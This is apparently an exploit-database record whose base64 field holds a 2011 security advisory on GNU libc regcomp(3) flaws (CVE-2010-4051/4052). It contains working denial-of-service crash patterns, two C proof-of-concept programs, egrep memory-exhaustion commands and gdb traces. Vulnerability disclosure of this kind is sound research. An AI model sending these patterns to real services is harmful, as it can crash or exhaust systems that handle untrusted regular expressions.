{
    "source": "exploit-database", 
    "exploit": "Ly8gc291cmNlOiBodHRwOi8vc2VjdXJpdHlyZWFzb24uY29tL3NlY3VyaXR5YWxlcnQvODAwMw0KDQotLS0tLUJFR0lOIFBHUCBTSUdORUQgTUVTU0FHRS0tLS0tDQpIYXNoOiBTSEExDQoNClsgR05VIGxpYmMvcmVnY29tcCgzKSBNdWx0aXBsZSBWdWxuZXJhYmlsaXRpZXMgXQ0KDQpBdXRob3I6IE1ha3N5bWlsaWFuIEFyY2llbW93aWN6DQpodHRwOi8vc2VjdXJpdHlyZWFzb24uY29tLw0KaHR0cDovL2N4aWIubmV0Lw0KRGF0ZToNCi0gLSBEaXMuOiAwMS4xMC4yMDEwDQotIC0gUHViLjogMDcuMDEuMjAxMQ0KDQpDRVJUOiBWVSM5MTIyNzkNCkNWRToNCkNWRS0yMDEwLTQwNTENCkNWRS0yMDEwLTQwNTINCg0KQWZmZWN0ZWQgKHRlc3RlZCk6DQotIC0gVWJ1bnR1IDEwLjEwDQotIC0gU2xhY2t3YXJlIDEzDQotIC0gR2VudG9vIDE4LjEwLjIwMTANCi0gLSBGcmVlQlNEIDguMSAoZ3JlcCgxKSkNCi0gLSBOZXRCU0QgNS4wLjIgKGdyZXAoMSkpDQoNCk9yaWdpbmFsIFVSTDoNCmh0dHA6Ly9zZWN1cml0eXJlYXNvbi5jb20vYWNoaWV2ZW1lbnRfc2VjdXJpdHlhbGVydC85Mw0KDQpFeHBsb2l0IGZvciBwcm9mdHBkOg0KaHR0cDovL2N4aWIubmV0L3N0dWZmL3Byb2Z0cGQuZ251LmMNCg0KDQotIC0tLSAwLkRlc2NyaXB0aW9uIC0tLQ0KVGhlIEdOVSBDIGxpYnJhcnkgaXMgdXNlZCBhcyB0aGUgQyBsaWJyYXJ5IGluIHRoZSBHTlUgc3lzdGVtIGFuZCBtb3N0DQpzeXN0ZW1zIHdpdGggdGhlIExpbnV4IGtlcm5lbC4NCg0KIyBkZWZpbmUgUkVfRFVQX01BWCAoMHg3ZmZmKQ0KDQpyZWdjb21wKCkgaXMgdXNlZCB0byBjb21waWxlIGEgcmVndWxhciBleHByZXNzaW9uIGludG8gYSBmb3JtIHRoYXQgaXMNCnN1aXRhYmxlIGZvciBzdWJzZXF1ZW50IHJlZ2V4ZWMoKSBzZWFyY2hlcy4NCg0KDQotIC0tLSAxLiBSRV9EVVBfTUFYIG92ZXJmbG93IC0tLQ0KVGhlIG1haW4gcHJvYmxlbSBleGlzdHMgaW4gcmVnY29tcCgzKSBmdW5jdGlvbiBvZiBHTlUgbGliYyBpbXBsZW1lbnRhdGlvbi4NCkxldGBzIHRyeSB1bmRlcnN0YW5kLi4NCg0KLSAtLS0NCmludA0KcmVnY29tcCAocHJlZywgcGF0dGVybiwgY2ZsYWdzKQ0KcmVnZXhfdCAqX19yZXN0cmljdCBwcmVnOw0KY29uc3QgY2hhciAqX19yZXN0cmljdCBwYXR0ZXJuOw0KaW50IGNmbGFnczsNCnsNCi0gLS0tDQoNCmlmIHdlIHVzZSAneycsIHRva2VuIHR5cGUgd2lsbCBiZSBPUF9PUEVOX0RVUF9OVU0uDQoNCi0gLS0tDQovKiBUaGlzIGZ1bmN0aW9uIHBhcnNlIHJlcGV0aXRpb24gb3BlcmF0b3JzIGxpa2UgIioiLCAiKyIsICJ7MSwzfSIgZXRjLg0KKi8NCg0Kc3RhdGljIGJpbl90cmVlX3QgKg0KcGFyc2VfZHVwX29wIChiaW5fdHJlZV90ICplbGVtLCByZV9zdHJpbmdfdCAqcmVnZXhwLCByZV9kZmFfdCAqZGZhLA0KcmVfdG9rZW5fdCAqdG9rZW4sIHJlZ19zeW50YXhfdCBzeW50YXgsIHJlZ19lcnJjb2RlX3QgKmVycikNCnsNCmJpbl90cmVlX3QgKnRyZWUgPSBOVUxMLCAqb2xkX3RyZWUgPSBOVUxMOw0KaW50IGksIHN0YXJ0LCBlbmQsIHN0YXJ0X2lkeCA9IHJlX3N0cmluZ19jdXJfaWR4IChyZWdleHApOw0KcmVfdG9rZW5fdCBzdGFydF90b2tlbiA9ICp0b2tlbjsNCg0KaWYgKHRva2VuLT50eXBlID09IE9QX09QRU5fRFVQX05VTSkNCnsNCmVuZCA9IDA7DQpzdGFydCA9IGZldGNoX251bWJlciAocmVnZXhwLCB0b2tlbiwgc3ludGF4KTsgPD09PT09IENPTlZFUlQgVkFMVUUNCi0gLS0tDQoNCmxldGBzIHNlZSBmZXRjaF9udW1iZXIgPT4NCg0KLSAtLS0NCnN0YXRpYyBpbnQNCmZldGNoX251bWJlciAocmVfc3RyaW5nX3QgKmlucHV0LCByZV90b2tlbl90ICp0b2tlbiwgcmVnX3N5bnRheF90IHN5bnRheCkNCnsNCmludCBudW0gPSAtMTsNCnVuc2lnbmVkIGNoYXIgYzsNCndoaWxlICgxKQ0Kew0KZmV0Y2hfdG9rZW4gKHRva2VuLCBpbnB1dCwgc3ludGF4KTsNCmMgPSB0b2tlbi0+b3ByLmM7DQppZiAoQkUgKHRva2VuLT50eXBlID09IEVORF9PRl9SRSwgMCkpDQpyZXR1cm4gLTI7DQppZiAodG9rZW4tPnR5cGUgPT0gT1BfQ0xPU0VfRFVQX05VTSB8fCBjID09ICcsJykNCmJyZWFrOw0KbnVtID0gKCh0b2tlbi0+dHlwZSAhPSBDSEFSQUNURVIgfHwgYyA8ICcwJyB8fCAnOScgPCBjIHx8IG51bSA9PSAtMikNCj8gLTIgOiAoKG51bSA9PSAtMSkgPyBjIC0gJzAnIDogbnVtICogMTAgKyBjIC0gJzAnKSk7DQpudW0gPSAobnVtID4gUkVfRFVQX01BWCkgPyAtMiA6IG51bTsNCn0NCnJldHVybiBudW07DQp9DQotIC0tLQ0KDQpub3cgc2VlIHJlZ2V4LmggdG8ga25vdywgd2hhdCB2YWx1ZSBoYXZlIFJFX0RVUF9NQVgNCg0KLSAtLS0NCi8qIE1heGltdW0gbnVtYmVyIG9mIGR1cGxpY2F0ZXMgYW4gaW50ZXJ2YWwgY2FuIGFsbG93LiBTb21lIHN5c3RlbXMNCihlcnJvbmVvdXNseSkgZGVmaW5lIHRoaXMgaW4gb3RoZXIgaGVhZGVyIGZpbGVzLCBidXQgd2Ugd2FudCBvdXINCnZhbHVlLCBzbyByZW1vdmUgYW55IHByZXZpb3VzIGRlZmluZS4gKi8NCiMgaWZkZWYgUkVfRFVQX01BWA0KIyB1bmRlZiBSRV9EVVBfTUFYDQojIGVuZGlmDQovKiBJZiBzaXplb2YoaW50KSA9PSAyLCB0aGVuICgoMSA8PCAxNSkgLSAxKSBvdmVyZmxvd3MuICovDQojIGRlZmluZSBSRV9EVVBfTUFYICgweDdmZmYpDQojZW5kaWYNCi0gLS0tDQoNCmNhbGNfZWNsb3N1cmVfaXRlcigpIHdpbGwgY2FsbCB0byBjYWxjX2VjbG9zdXJlX2l0ZXIoKSBtYXRjaCB0aW1lLiBhbmQNCmNyYXNoIGluIG1hbGxvYygzKS4gU2ltcGxlIFJlY3Vyc2lvbi4NCg0Kc28gd2UgY2FuJ3QgdXNlIHZhbHVlIGJpZ2dlciAweDdmZmYgaW4ge24sfS4gcmVnY29tcCgzKSBzaG91bGQgcmV0dXJuIEVSUk9SDQppZiB3ZSB1c2UgbW9yZSB0aGF0IG9uZSB0aW1lICd7JyB0b2tlbi4NCg0KVGhleSBhcmUgbWFueSB2ZWN0b3JzIGF0dGFjaw0KDQpncmVwKDEpOg0KY3hAY3g2NDp+JCBscyB8Z3JlcCAtRSAiLip7MTAsfXsxMCx9ezEwLH17MTAsfXsxMCx9Ig0KU2VnbWVudGF0aW9uIGZhdWx0DQoNCnBncmVwKDEpOg0KY3hAY3g2NDp+JCBwZ3JlcCAiLip7MTAsfXsxMCx9ezEwLH17MTAsfXsxMCx9Ig0KU2VnbWVudGF0aW9uIGZhdWx0DQoNCmJyZWdleCBmcm9tIGJhY3VsYS1kaXJlY3Rvci1jb21tb24NCmN4QGN4NjQ6fiQgYnJlZ2V4IC1mIGdsb2ItMGRheS5jDQpFbnRlciByZWdleCBwYXR0ZXJuOiAuKnsxMCx9ezEwLH17MTAsfXsxMCx9ezEwLH0NClNlZ21lbnRhdGlvbiBmYXVsdA0KDQp3aGF0aXMoMSk6DQpjeEBjeDY0On4kIHdoYXRpcyAtciAiLip7MTAsfXsxMCx9ezEwLH17MTAsfXsxMCx9Ig0KU2VnbWVudGF0aW9uIGZhdWx0DQoNCmFuZCBtb3JlIGxpa2UgcHJvZnRwZC4NCg0KU2ltcGxlIGNyYXNoIGZvciBDVkUtMjAxMC00MDUxDQooZ2RiKSB4L2kgJHJpcA0KPT4gMHg3ZmZmZjdhZDNlYTI6IG1vdiAlZWF4LDB4NTAoJXJzcCkNCihnZGIpIHgvaSAkZWF4DQoweDI6IENhbm5vdCBhY2Nlc3MgbWVtb3J5IGF0IGFkZHJlc3MgMHgyDQooZ2RiKSB4L2kgJHJzcA0KMHg3ZmZmZmY1ZmVmOTA6IENhbm5vdCBhY2Nlc3MgbWVtb3J5IGF0IGFkZHJlc3MgMHg3ZmZmZmY1ZmVmOTANCihnZGIpIHgvaSAweDUwKCRyc3ApDQpDYW5ub3QgYWNjZXNzIG1lbW9yeSBhdCBhZGRyZXNzIDB4N2ZmZmZmNWZlZjA4DQoNCg0KIzAgMHgwMDAwN2ZmZmY3YWQzZWEyIGluID8/ICgpIGZyb20gL2xpYi9saWJjLnNvLjYNCiMxIDB4MDAwMDdmZmZmN2FkNTM4ZSBpbiBtYWxsb2MgKCkgZnJvbSAvbGliL2xpYmMuc28uNg0KIzIgMHgwMDAwN2ZmZmY3YjE3ZDliIGluID8/ICgpIGZyb20gL2xpYi9saWJjLnNvLjYNCiMzIDB4MDAwMDdmZmZmN2IxN2YwYiBpbiA/PyAoKSBmcm9tIC9saWIvbGliYy5zby42DQojNCAweDAwMDA3ZmZmZjdiMTdmMGIgaW4gPz8gKCkgZnJvbSAvbGliL2xpYmMuc28uNg0KIzUgMHgwMDAwN2ZmZmY3YjE3ZjBiIGluID8/ICgpIGZyb20gL2xpYi9saWJjLnNvLjYNCiM2IDB4MDAwMDdmZmZmN2IxN2YwYiBpbiA/PyAoKSBmcm9tIC9saWIvbGliYy5zby42DQojNyAweDAwMDA3ZmZmZjdiMTdmMGIgaW4gPz8gKCkgZnJvbSAvbGliL2xpYmMuc28uNg0KLi4uDQoNCi0gLS0tUG9DMS0tLQ0KI2luY2x1ZGUgPHJlZ2V4Lmg+DQoNCmludCBtYWluKCl7DQpyZWdleF90IHByZWc7DQoNCi8vIGNoYXIgZm10W109Ii4qezEwLH17MTAsfXsxMCx9ezEwLH0iOyAvLyBDVkUtMjAxMC00MDUyDQpjaGFyIGZtdFtdPSIuKnsxMCx9ezEwLH17MTAsfXsxMCx9ezEwLH0iOyBDVkUtMjAxMC00MDUxDQoNCnJlZ2NvbXAgKCZwcmVnLCBmbXQsIFJFR19FWFRFTkRFRCk7DQoNCnJldHVybiAwOw0KfQ0KLSAtLS1Qb0MxLS0tDQoNCi0gLS0tIDIuIFN0YWNrIEV4aGF1c2lvbiAtLS0NClRoaXMgaXNzdWUsIG1heSBiZSBhbHNvIHVzZSB0byBEZW5pYWwgb2YgU2VydmljZSBieSBzdGFjayBleGhhdXNpb24NCg0KI2xzIHxncmVwIC1FICIuKnsxMCx9ezEwLH17MTExMTExLH0iDQoNCi0gLS0tUG9DMi0tLQ0KI2luY2x1ZGUgPHJlZ2V4Lmg+DQoNCmludA0KbWFpbiAoKQ0Kew0KcmVnZXhfdCBwcmVnOw0KDQpjaGFyIGZtdFtdPSIuKnsxMCx9ezEwLH17MTAsfXsxMCx9IjsgLy8gQ1ZFLTIwMTAtNDA1Mg0KLy8gY2hhciBmbXRbXT0iLip7MTAsfXsxMCx9ezEwLH17MTAsfXsxMCx9IjsgLy8gQ1ZFLTIwMTAtNDA1MQ0KDQpyZWdjb21wICgmcHJlZywgZm10LCBSRUdfRVhURU5ERUQpOw0KDQpyZXR1cm4gMDsNCn0NCi0gLS0tUG9DMi0tLQ0KDQpTdWNoIGEgcGF0dGVybiBtYXkgbGVhZCB0byBhbGxvY2F0ZSBhIGxhcmdlIG1lbW9yeSBhcmVhLCBvciBsYXJnZSBleGVjdXRpb24NCnRpbWUNCg0KQXMgd2UgY2FuIHJlYWQgaW4gdnNmdHBkL0hBQ0tJTkcNCg0KLSAtLS0NCi0gZG8gbm90IHVzZSBsaWJjIGZlYXR1cmVzIHRoYXQgYXJlICJjb21wbGljYXRlZCINCmFuZCBtYXkgY29udGFpbiBzZWN1cml0eSBob2xlcy4gRm9yIGV4YW1wbGUsIHlvdSBwcm9iYWJseSBzaG91bGRuJ3QNCnRyeSB0byB1c2UgcmVnY29tcCgpIHRvIGNvbXBpbGUgYW4gdW50cnVzdGVkIHJlZ3VsYXIgZXhwcmVzc2lvbi4NClJlZ3VsYXIgZXhwcmVzc2lvbnMgYXJlIGp1c3QgdG9vIGNvbXBsaWNhdGVkLCBhbmQgdGhlcmUgYXJlIG1hbnkNCmRpZmZlcmVudCBsaWJjJ3Mgb3V0IHRoZXJlLg0KLSAtLS0NCg0KVGhhdCdzIHRydWUuIEJ1dCB0aGUgd29yc3QgaW1wbGVtZW50YXRpb24gb2YgbGliIEMgaXMgR05VLiBUaGVyZSBpcyBhIGh1Z2UNCmRpZmZlcmVuY2UgdXNpbmcgcHJvZnRwZCBvbiBOZXRCU0QgYW5kIExpbnV4DQoNCg0KLSAtLS0gMy4gU3RhY2sgRXhoYXVzaW9ucyAtLS0NClN0YWNrIEV4aGF1c2lvbnMgd2FzIGZvdW5kIGluIEdOVSBnbGliYy4NCg0KLSAtLS1Qb0MzLS0tDQovYmluL2VncmVwICIvKC4qKysrKysrKysrKysrKysrKysrKysrKysrKysrKysoXHcrKSkvaW0iIGN4DQotIC0tLVBvQzMtLS0NCg0Kd2hlbiBtb3JlICcrJyB0aGF0IG1vcmUgYWxsb2NhdGVkIG1lbW9yeS4gQnV0IGxldCdzIHNlZSBuZXh0IG9uZQ0KDQotIC0tLVBvQzQtLS0NCmN4QGN4NjQ6fiQgdWxpbWl0IC1tIDEwMDAwMA0KY3hAY3g2NDp+JCB1bGltaXQgLXYgMjAwMDAwDQpjeEBjeDY0On4kIC9iaW4vZWdyZXAgIi8oLiorKysrKysrKysrKysrKysrKysrKysrKysrKysrKyhcdyspKS9pbSIgY3gNClNlZ21lbnRhdGlvbiBmYXVsdA0KY3hAY3g2NDp+JA0KLSAtLS1Qb0M0LS0tDQoNCnRoZSBzYW1lIGNvbW1hbmQgbGlrZSBpbiBQb0MgMywgZmFpbHMuDQoNCihnZGIpIHIgIi8oLiorKysrKysrKysrKysrKysrKysoXHcrKSkvaW0iIGN4DQpTdGFydGluZyBwcm9ncmFtOiAvYmluL2VncmVwICIvKC4qKysrKysrKysrKysrKysrKysrKFx3KykpL2ltIiBjeA0KL2Jpbi9lZ3JlcDogTWVtb3J5IGV4aGF1c3RlZA0KDQpBZGQgb25lICIrIiBtb3JlDQoNClByb2dyYW0gZXhpdGVkIHdpdGggY29kZSAwMi4NCihnZGIpIHIgIi8oLiorKysrKysrKysrKysrKysrKysrKFx3KykpL2ltIiBjeA0KVGhlIHByb2dyYW0gYmVpbmcgZGVidWdnZWQgaGFzIGJlZW4gc3RhcnRlZCBhbHJlYWR5Lg0KU3RhcnQgaXQgZnJvbSB0aGUgYmVnaW5uaW5nPyAoeSBvciBuKSB5DQoNClN0YXJ0aW5nIHByb2dyYW06IC9iaW4vZWdyZXAgIi8oLiorKysrKysrKysrKysrKysrKysrKFx3KykpL2ltIiBjeA0KDQpQcm9ncmFtIHJlY2VpdmVkIHNpZ25hbCBTSUdTRUdWLCBTZWdtZW50YXRpb24gZmF1bHQuDQpfX2xpYmNfZnJlZSAobWVtPTB4N2ZmZmY3MjBhMDEwKSBhdCBtYWxsb2MuYzozNzA5DQozNzA5IGlmIChjaHVua19pc19tbWFwcGVkKHApKSAvKiByZWxlYXNlIG1tYXBwZWQNCm1lbW9yeS4gKi8NCihnZGIpIGJ0DQojMCBfX2xpYmNfZnJlZSAobWVtPTB4N2ZmZmY3MjBhMDEwKSBhdCBtYWxsb2MuYzozNzA5DQojMSAweDAwMDA3ZmZmZjc5MTM0MzEgaW4gZnJlZV9kZmFfY29udGVudCAoZGZhPTB4NjFmMGMwKSBhdCByZWdjb21wLmM6NjAwDQojMiAweDAwMDA3ZmZmZjc5MjRlMWMgaW4gcmVfY29tcGlsZV9pbnRlcm5hbCAocHJlZz0weDYxZjA2MCwgcGF0dGVybj0weDAsDQoNCmxlbmd0aD0xNDA3Mzc0ODgzNDcxNzYsIHN5bnRheD08dmFsdWUgb3B0aW1pemVkIG91dD4pIGF0IHJlZ2NvbXAuYzo4MjMNCiMzIDB4MDAwMDdmZmZmNzkyNTZkZSBpbiBfX3JlX2NvbXBpbGVfcGF0dGVybiAocGF0dGVybj0weDAsDQpsZW5ndGg9PHZhbHVlIG9wdGltaXplZCBvdXQ+LCBidWZwPTB4N2ZmZmY3MjBhMDEwKSBhdCByZWdjb21wLmM6MjMxDQoNCi0gLS0tbWFsbG9jLmMtLS0NCi4uLg0KaWYgKG1lbSA9PSAwKSAvKiBmcmVlKDApIGhhcyBubyBlZmZlY3QgKi8NCnJldHVybjsNCg0KcCA9IG1lbTJjaHVuayhtZW0pOw0KDQojaWYgSEFWRV9NTUFQDQppZiAoY2h1bmtfaXNfbW1hcHBlZChwKSkNCi4uLg0KLSAtLS1tYWxsb2MuYy0tLQ0KDQp3aGVyZQ0KI2RlZmluZSBtZW0yY2h1bmsobWVtKSAoKG1jaHVua3B0cikoKGNoYXIqKShtZW0pIC0gMipTSVpFX1NaKSkNCg0KbWVtIHZhcmlhYmxlIChtZW09MHg3ZmZmZjcyMGEwMTApDQoNCihnZGIpIHgveCAweDdmZmZmNzIwYTAxMA0KMHg3ZmZmZjcyMGEwMTA6IDB4MDANCg0Kb3INCg0KKGdkYikgeC94IDB4N2ZmZmY3MjBhMDEwDQoweDdmZmZmNzIwYTAxMDogQ2Fubm90IGFjY2VzcyBtZW1vcnkgYXQgYWRkcmVzcyAweDdmZmZmNzIwYTAxMA0KDQooZ2RiKSB4L2kgJHJpcA0KPT4gMHg3ZmZmZjc4ZDJjMmQgPF9fbGliY19mcmVlKzI5PjogbW92IC0weDgoJXJkaSksJXJzaQ0KKGdkYikgeC9pICRyZGkNCjB4N2ZmZmY3ZWQzMDEwOiBDYW5ub3QgYWNjZXNzIG1lbW9yeSBhdCBhZGRyZXNzIDB4N2ZmZmY3ZWQzMDEwDQooZ2RiKSB4L2kgJHJzaQ0KMHgwOiBDYW5ub3QgYWNjZXNzIG1lbW9yeSBhdCBhZGRyZXNzIDB4MA0KDQpvciBjaGVjayB0aGlzDQoNCihnZGIpIHIgIi8oLiorKysrKysrKysrKysrKysrKysrKFx3KykpL2ltIiBjeA0KVGhlIHByb2dyYW0gYmVpbmcgZGVidWdnZWQgaGFzIGJlZW4gc3RhcnRlZCBhbHJlYWR5Lg0KU3RhcnQgaXQgZnJvbSB0aGUgYmVnaW5uaW5nPyAoeSBvciBuKSB5DQoNClN0YXJ0aW5nIHByb2dyYW06IC9iaW4vZWdyZXAgIi8oLiorKysrKysrKysrKysrKysrKysrKFx3KykpL2ltIiBjeA0KDQpQcm9ncmFtIHJlY2VpdmVkIHNpZ25hbCBTSUdTRUdWLCBTZWdtZW50YXRpb24gZmF1bHQuDQpwYXJzZV9kdXBfb3AgKHJlZ2V4cD0weDdmZmZmZmZmZGY3MCwgcHJlZz08dmFsdWUgb3B0aW1pemVkIG91dD4sDQp0b2tlbj0weDdmZmZmZmZmZTAxMCwgc3ludGF4PTx2YWx1ZSBvcHRpbWl6ZWQgb3V0PiwNCm5lc3Q9PHZhbHVlIG9wdGltaXplZCBvdXQ+LCBlcnI9PHZhbHVlIG9wdGltaXplZCBvdXQ+KSBhdA0KcmVnY29tcC5jOjI1NDcNCjI1NDcgaWYgKGVsZW0tPnRva2VuLnR5cGUgPT0gU1VCRVhQKQ0KKGdkYikgeC9pICRyaXANCj0+IDB4N2ZmZmY3OTIyNjQ0IDxwYXJzZV9leHByZXNzaW9uKzc1Nj46IGNtcGIgJDB4MTEsMHgzMCglcjE1KQ0KKGdkYikgeC9pICRyMTUNCjB4MDogQ2Fubm90IGFjY2VzcyBtZW1vcnkgYXQgYWRkcmVzcyAweDANCg0KcmF4IDB4MCAwDQpyYnggMHg2MWYwYzAgNjQxODYyNA0KcmN4IDB4ZmZmZmZmZmZmZmZmZmZhOCAtODgNCnJkeCAweDAgMA0KcnNpIDB4NjFmMGMwIDY0MTg2MjQNCnJkaSAweDAgMA0KcmJwIDB4N2ZmZmZmZmZlMDEwIDB4N2ZmZmZmZmZlMDEwDQpyc3AgMHg3ZmZmZmZmZmRiNzAgMHg3ZmZmZmZmZmRiNzANCnI4IDB4ZmZmZmZmZmYgNDI5NDk2NzI5NQ0KcjkgMHgwIDANCnIxMCAweDQwMjIgMTY0MTgNCnIxMSAweDI0NiA1ODINCnIxMiAweDdmZmZmZmZmZGY3MCAxNDA3Mzc0ODgzNDY5OTINCnIxMyAweDQ3MzBhZTggNzQ2NDgyOTYNCnIxNCAweGZmZmZmZmZmIDQyOTQ5NjcyOTUNCnIxNSAweDAgMA0KcmlwIDB4N2ZmZmY3OTIyNjQ0IDB4N2ZmZmY3OTIyNjQ0IDxwYXJzZV9leHByZXNzaW9uKzc1Nj4NCg0KIzAgcGFyc2VfZHVwX29wIChyZWdleHA9MHg3ZmZmZmZmZmRmNzAsIHByZWc9PHZhbHVlIG9wdGltaXplZCBvdXQ+LA0KdG9rZW49MHg3ZmZmZmZmZmUwMTAsIHN5bnRheD08dmFsdWUgb3B0aW1pemVkIG91dD4sDQpuZXN0PTx2YWx1ZSBvcHRpbWl6ZWQgb3V0PiwgZXJyPTx2YWx1ZSBvcHRpbWl6ZWQgb3V0PikgYXQNCnJlZ2NvbXAuYzoyNTQ3DQojMSBwYXJzZV9leHByZXNzaW9uIChyZWdleHA9MHg3ZmZmZmZmZmRmNzAsIHByZWc9PHZhbHVlIG9wdGltaXplZCBvdXQ+LA0KdG9rZW49MHg3ZmZmZmZmZmUwMTAsIHN5bnRheD08dmFsdWUgb3B0aW1pemVkIG91dD4sDQpuZXN0PTx2YWx1ZSBvcHRpbWl6ZWQgb3V0PiwgZXJyPTx2YWx1ZSBvcHRpbWl6ZWQgb3V0PikgYXQNCnJlZ2NvbXAuYzoyMzkwDQojMiAweDAwMDA3ZmZmZjc5MjM4N2UgaW4gcGFyc2VfYnJhbmNoIChyZWdleHA9MHgwLCBwcmVnPTB4NjFmMGMwLA0KdG9rZW49MHgwLA0Kc3ludGF4PTE4NDQ2NzQ0MDczNzA5NTUxNTI4LCBuZXN0PS0xLCBlcnI9MHgwKSBhdCByZWdjb21wLmM6MjE2Mw0KIzMgcGFyc2VfcmVnX2V4cCAocmVnZXhwPTB4MCwgcHJlZz0weDYxZjBjMCwgdG9rZW49MHgwLA0Kc3ludGF4PTE4NDQ2NzQ0MDczNzA5NTUxNTI4LCBuZXN0PS0xLCBlcnI9MHgwKSBhdCByZWdjb21wLmM6MjEyMg0KDQoNCmlmIChCRSAoc3RhcnQgPiAwLCAwKSkNCnsNCnRyZWUgPSBlbGVtOw0KZm9yIChpID0gMjsgaSA8PSBzdGFydDsgKytpKQ0Kew0KZWxlbSA9IGR1cGxpY2F0ZV90cmVlIChlbGVtLCBkZmEpOw0KdHJlZSA9IGNyZWF0ZV90cmVlIChkZmEsIHRyZWUsIGVsZW0sIENPTkNBVCk7DQppZiAoQkUgKGVsZW0gPT0gTlVMTCB8fCB0cmVlID09IE5VTEwsIDApKQ0KZ290byBwYXJzZV9kdXBfb3BfZXNwYWNlOw0KfQ0KDQppZiAoc3RhcnQgPT0gZW5kKQ0KcmV0dXJuIHRyZWU7DQoNCi8qIER1cGxpY2F0ZSBFTEVNIGJlZm9yZSBpdCBpcyBtYXJrZWQgb3B0aW9uYWwuICovDQplbGVtID0gZHVwbGljYXRlX3RyZWUgKGVsZW0sIGRmYSk7DQpvbGRfdHJlZSA9IHRyZWU7DQp9DQplbHNlDQpvbGRfdHJlZSA9IE5VTEw7DQoNCmlmIChlbGVtLT50b2tlbi50eXBlID09IFNVQkVYUCkgPD1DUkFTSCBIRVJFDQoNClRoZXNlIHZ1bG5lcmFiaWxpdGllcyBhcmUgbm90IHJlYWxseSBkYW5nZXJvdXMuIEhvd2V2ZXIsIHRoZXJlIGlzIHRoZQ0KcG9zc2liaWxpdHkgdG8gdXNlIHRoZSBEb1MgYXR0YWNrLiBBbiBleGFtcGxlIG1pZ2h0IGJlIGFuIGV4cGxvaXQgZm9yDQpwcm9mdHBkLiBPcHRpb24gMyBhbGxvd3MgdG8gZXhoYXVzdGlvbiBhdmFsaWFibGUgbWVtb3J5LiBJbiBteSBvcGluaW9uLCB0aGUNCkdOVSBzaG91bGQgZml4IHRoZSBwcm9ibGVtLg0KDQoNCi0gLS0tIDQuIEV4cGxvaXQgLS0tDQpwcm9mdHBkL2xpbnV4Og0KaHR0cDovL2N4aWIubmV0L3N0dWZmL3Byb2Z0cGQuZ251LmMNCg0KDQotIC0tLSA1LiBHcmVldHMgLS0tDQpDaHJpc3RvcyBab3VsYXMsIFVTLUNFUlQsIHNwM3gsIEluZm9zcGVjDQoNCg0KLSAtLS0gNi4gQ29udGFjdCAtLS0NCkF1dGhvcjogU2VjdXJpdHlSZWFzb24uY29tIFsgTWFrc3ltaWxpYW4gQXJjaWVtb3dpY3ogXQ0KDQpFbWFpbDoNCi0gLSBjeGliIHthXC4vdF0gc2VjdXJpdHlyZWFzb24gW2Q9dH0gY29tDQoNCkdQRzoNCi0gLSBodHRwOi8vc2VjdXJpdHlyZWFzb24uY29tL2tleS9BcmNpZW1vd2ljei5NYWtzeW1pbGlhbi5ncGcNCg0KaHR0cDovL3NlY3VyaXR5cmVhc29uLmNvbS8NCmh0dHA6Ly9jeGliLm5ldC8NCi0tLS0tQkVHSU4gUEdQIFNJR05BVFVSRS0tLS0tDQpWZXJzaW9uOiBHbnVQRyB2MS40LjEwIChHTlUvTGludXgpDQoNCmlRSWNCQUVCQWdBR0JRSk5KazdyQUFvSkVJTzgrZHpXNWJVd1EvWVAvMUc0blhsdGFVZE1yZG9VdTM5RE0rV0oNCmMzZitrbFNPYlMvMWNEbXpCT1V0ZThkZGlEZEFWYlU1eVV2amtYa2pXd01teHlQcmVneFF4Rjg1aVVRMTlVSVANClBla3ZvNWl1STJVaDVocFdRaVR4eEhpVHFFc0dlUDlYekt6OXVMeFFQaWppY0Q2dmpvdmc4TWtTOXhFZGc2SUQNClExS1crN3RsV1k3eGdHWFRxWnV4OVk0Q3NNWHFJYVdoWmxJUEpqWERJRWlwZTZIenNLWjBVbVJQR0V1SkdTT2gNCjB0WDhPbTZQZW5GazhYT1FTcDIwSE1iSy9XMnFwYzFoUEFKMy9tckZPK3VQRis4c2NwdzQxM3VoandpU1hPVWoNCkhVV0UvaWlvRkhSdVg5ZWIybXdEdVBLTmUzMk9nTFBScGN6MW5JVFFWck9YVHlmbndVdFByUWVSdTZoOERwdjcNClJHUXREMkdkS2tuRHBrZmJVY3cwL0VITVNiV2FKZE9XWmZGZERBbCtyRWhTOEF3UE5LMk5KYis3TEo2QVFtc00NClZDckpQUDVlTTFYTTlqc1FUOXR2aHlPdW52dy9ITW9IL2srR1AzNHArRmlLRElZSTFMRjNHeGovdzUzZ1VLM0YNCm5ZTHptb2FobnFDNFdkZlVmWml6ZjI0UFhtSCszODVKb1N0cnBDNEVtbjFrdUZyTTlpL2VYUTN4STlNeTBPWEoNClBGSG1WQ0Z4LzRpWFNpL1lOY1NoWmVsbHdpNjBrRmUyT3ZmSjhCWXRHMTVIK3hyMGRqem5MaE1xYnIyWU1pc0oNCjA2NldXcGZlMWhUVEplekxqYk04U2E5Tm51ZlhuRVYraldVb2NRK2RzU2EyVGVjbjhEcnNHb3IwWWQ2VVI2aW4NCnM2K09JVkZkZHRJWnJRNmR3K0trDQo9a2NJRw0KLS0tLS1FTkQgUEdQIFNJR05BVFVSRS0tLS0t", 
    "filename": "platforms/linux/dos/15935.c", 
    "id": "15935", 
    "cves": [
        "CVE-2010-4052", 
        "CVE-2010-4051"
    ]
}